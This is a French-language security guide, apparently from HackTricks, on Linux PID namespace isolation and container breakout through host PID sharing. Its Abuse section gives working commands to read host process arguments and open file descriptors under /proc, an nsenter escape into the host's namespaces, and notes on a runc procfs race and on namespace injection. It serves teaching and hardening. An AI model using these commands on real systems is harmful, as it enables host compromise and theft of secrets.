# Espace de noms PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

L'espace de noms PID contrôle la façon dont les processus sont numérotés et quels processus sont visibles. C'est pourquoi un container peut avoir son propre PID 1 même s'il n'est pas une vraie machine. À l'intérieur de l'espace de noms, la charge de travail voit ce qui semble être un arbre de processus local. En dehors de l'espace de noms, l'hôte voit toujours les vrais PIDs de l'hôte et l'ensemble du paysage des processus.

D'un point de vue sécurité, l'espace de noms PID importe car la visibilité des processus est précieuse. Une fois qu'une charge de travail peut voir les processus de l'hôte, elle peut être capable d'observer les noms de services, les arguments de la ligne de commande, les secrets passés dans les arguments de processus, l'état dérivé de l'environnement via `/proc`, et des cibles potentielles d'entrée dans des namespaces. Si elle peut faire plus que simplement voir ces processus — par exemple envoyer des signaux ou utiliser ptrace dans les bonnes conditions — le problème devient bien plus sérieux.

## Fonctionnement

Un nouvel espace de noms PID commence avec sa propre numérotation interne des processus. Le premier processus créé à l'intérieur devient PID 1 du point de vue de l'espace de noms, ce qui signifie également qu'il bénéficie de comportements spéciaux de type init pour les enfants orphelins et le comportement des signaux. Cela explique beaucoup d'anomalies dans les containers autour des processus init, du retrait des zombies et pourquoi de petits wrappers init sont parfois utilisés dans les containers.

La leçon de sécurité importante est qu'un processus peut sembler isolé parce qu'il ne voit que son propre arbre de PID, mais cette isolation peut être délibérément levée. Docker expose ceci via `--pid=host`, tandis que Kubernetes le fait via `hostPID: true`. Une fois que le container rejoint l'espace de noms PID de l'hôte, la charge de travail voit directement les processus de l'hôte, et de nombreuses voies d'attaque ultérieures deviennent beaucoup plus réalistes.

## Laboratoire

Pour créer manuellement un espace de noms PID :
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Le shell voit maintenant une vue privée des processus. Le flag `--mount-proc` est important car il monte une instance de procfs qui correspond au nouveau PID namespace, rendant la liste des processus cohérente depuis l'intérieur.

Pour comparer le comportement du container :
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La différence est immédiate et facile à comprendre, ce qui fait de ce laboratoire un bon premier exercice pour les lecteurs.

## Runtime Usage

Les containers normaux dans Docker, Podman, containerd et CRI-O obtiennent leur propre espace de noms PID. Les Kubernetes Pods reçoivent généralement aussi une vue PID isolée sauf si le workload demande explicitement le host PID sharing. Les environnements LXC/Incus s'appuient sur la même primitive du noyau, bien que les cas d'utilisation de system-container puissent exposer des arbres de processus plus compliqués et encourager davantage de raccourcis de debugging.

La même règle s'applique partout : si le runtime a choisi de ne pas isoler l'espace de noms PID, c'est une réduction délibérée de la frontière du container.

## Misconfigurations

La mauvaise configuration canonique est le host PID sharing. Les équipes le justifient souvent pour le debugging, le monitoring ou la commodité de gestion de service, mais cela doit toujours être traité comme une exception de sécurité significative. Même si le container n'a aucun privilège d'écriture immédiat sur les processus de l'hôte, la seule visibilité peut révéler beaucoup sur le système. Une fois que des capacités telles que `CAP_SYS_PTRACE` ou un accès utile à procfs sont ajoutées, le risque s'étend significativement.

Une autre erreur est de supposer que parce que le workload ne peut pas kill ou ptrace les processus de l'hôte par défaut, le host PID sharing est donc inoffensif. Cette conclusion ignore la valeur de l'énumération, la disponibilité de cibles permettant l'entrée dans un espace de noms, et la manière dont la visibilité des PID se combine avec d'autres contrôles affaiblis.

## Abuse

Si l'espace de noms PID de l'hôte est partagé, un attaquant peut inspecter les processus de l'hôte, récolter les arguments des processus, identifier des services intéressants, localiser des PIDs candidats pour `nsenter`, ou combiner la visibilité des processus avec des privilèges liés à ptrace pour interférer avec les workloads de l'hôte ou voisins. Dans certains cas, voir simplement le bon processus de longue durée suffit à reshaper le reste du plan d'attaque.

La première étape pratique est toujours de confirmer que les processus de l'hôte sont réellement visibles :
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Une fois que les PIDs de l'hôte sont visibles, les arguments des processus et les cibles d'entrée du namespace deviennent souvent la source d'information la plus utile :
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` est disponible et que vous avez suffisamment de privilèges, testez si un processus hôte visible peut être utilisé comme namespace bridge :
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Même lorsque l'accès est bloqué, le partage des PID de l'hôte est déjà précieux car il révèle la disposition des services, les composants d'exécution et les processus privilégiés candidats à cibler ensuite.

La visibilité des PID de l'hôte rend aussi l'abus de descripteurs de fichiers plus réaliste. Si un processus privilégié de l'hôte ou une charge de travail voisine a un fichier ou un socket sensible ouvert, l'attaquant peut être en mesure d'inspecter `/proc/<pid>/fd/` et de réutiliser ce descripteur selon la propriété, les options de montage de procfs et le modèle de service cible.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ces commandes sont utiles parce qu'elles répondent à la question de savoir si `hidepid=1` ou `hidepid=2` réduit la visibilité inter-processus et si des descripteurs évidemment intéressants, tels que des fichiers secrets ouverts, des logs ou des Unix sockets, sont visibles.

### Exemple complet : PID de l'hôte + `nsenter`

Le partage du PID de l'hôte devient une évasion directe vers l'hôte lorsque le processus dispose également de privilèges suffisants pour rejoindre les namespaces de l'hôte :
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si la commande réussit, le processus du conteneur s'exécute maintenant dans les namespaces mount, UTS, network, IPC et PID de l'hôte. L'impact est une compromission immédiate de l'hôte.

Même lorsque `nsenter` lui-même est absent, le même résultat peut être obtenu via le binaire de l'hôte si le système de fichiers de l'hôte est monté :
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notes récentes d'exécution

Certaines attaques pertinentes au PID namespace ne sont pas des mauvaises configurations traditionnelles `hostPID: true`, mais des bugs d'implémentation au runtime autour de la façon dont les protections procfs sont appliquées lors de la configuration du conteneur.

#### `maskedPaths` race vers le procfs de l'hôte

Dans des versions vulnérables de `runc`, des attaquants pouvant contrôler l'image du conteneur ou la charge de travail lancée via `runc exec` pouvaient faire une race durant la phase de masquage en remplaçant le `/dev/null` côté conteneur par un lien symbolique pointant vers un chemin procfs sensible tel que `/proc/sys/kernel/core_pattern`. Si la race réussissait, le bind mount du chemin masqué pouvait atterrir sur la mauvaise cible et exposer des réglages procfs globaux de l'hôte au nouveau conteneur.

Commande utile :
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Ceci est important car l'impact final peut être le même qu'une exposition directe de procfs : `core_pattern` ou `sysrq-trigger` modifiables, suivis d'une exécution de code sur l'hôte ou d'un déni de service.

#### Namespace injection with `insject`

Les outils de Namespace injection tels que `insject` montrent que l'interaction avec le PID-namespace n'exige pas toujours d'entrer préalablement dans le namespace cible avant la création du processus. Un helper peut s'attacher ensuite, utiliser `setns()`, et s'exécuter tout en conservant la visibilité sur le PID space cible :
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ce type de technique est principalement utile pour le débogage avancé, les outils offensifs, et les workflows de post-exploitation où le contexte de namespace doit être rejoint après que le runtime a déjà initialisé la charge de travail.

### Schémas d'abus liés aux FD

Deux schémas valent la peine d'être mentionnés explicitement lorsque les PIDs de l'hôte sont visibles. Premièrement, un processus privilégié peut conserver un descripteur de fichier sensible ouvert à travers `execve()` parce qu'il n'a pas été marqué `O_CLOEXEC`. Deuxièmement, des services peuvent transmettre des descripteurs de fichier via des sockets Unix grâce à `SCM_RIGHTS`. Dans les deux cas, l'objet intéressant n'est plus le chemin (pathname), mais le descripteur déjà ouvert que peut hériter ou recevoir un processus de moindre privilège.

Ceci est important dans le travail sur conteneurs car le descripteur peut pointer vers `docker.sock`, un log privilégié, un fichier secret de l'hôte, ou un autre objet de grande valeur même lorsque le chemin lui-même n'est pas directement accessible depuis le système de fichiers du conteneur.

## Vérifications

Le but de ces commandes est de déterminer si le processus dispose d'une vue privée des PID ou s'il peut déjà énumérer un ensemble de processus beaucoup plus vaste.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Si la liste des processus contient des services évidents de l'hôte, il est probable que le conteneur partage les PID avec l'hôte.
- Ne voir qu'un petit arbre de processus local au conteneur est la situation normale ; la présence de `systemd`, `dockerd` ou de daemons sans rapport ne l'est pas.
- Une fois que les PID de l'hôte sont visibles, même les informations en lecture seule sur les processus deviennent une reconnaissance utile.

Si vous découvrez un conteneur s'exécutant avec le partage des PID avec l'hôte, ne le considérez pas comme une différence cosmétique. C'est un changement majeur dans ce que la charge de travail peut observer et potentiellement affecter.
{{#include ../../../../../banners/hacktricks-training.md}}
